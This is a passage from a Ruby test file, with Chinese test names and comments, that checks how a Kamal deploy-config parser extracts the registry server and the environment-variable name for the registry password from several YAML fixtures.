    parsed = Kamal::ConfigParser.call(yaml: file_fixture("registry_env_deploy.yml").read)

    assert_equal "MY_OWN_REGISTRY_TOKEN", parsed.registry_password_env
  end

  # deploy.yml 里已经写了明文密码：面板没有可注入的位置，也不该假装有。
  test "密码写成字面量时没有可注入的变量名" do
    parsed = Kamal::ConfigParser.call(yaml: file_fixture("registry_literal_deploy.yml").read)

    assert_nil parsed.registry_password_env
  end

  test "既有 fixture 的 registry 密码是数组形式，解析出对应的变量名" do
    parsed = Kamal::ConfigParser.call(yaml: file_fixture("simple_deploy.yml").read)

    assert_equal "registry.example.com", parsed.registry_server,
      "这个 fixture 本来就有 registry 段，用它来确认解析没坏"
    assert_equal "KAMAL_REGISTRY_PASSWORD", parsed.registry_password_env
  end
end
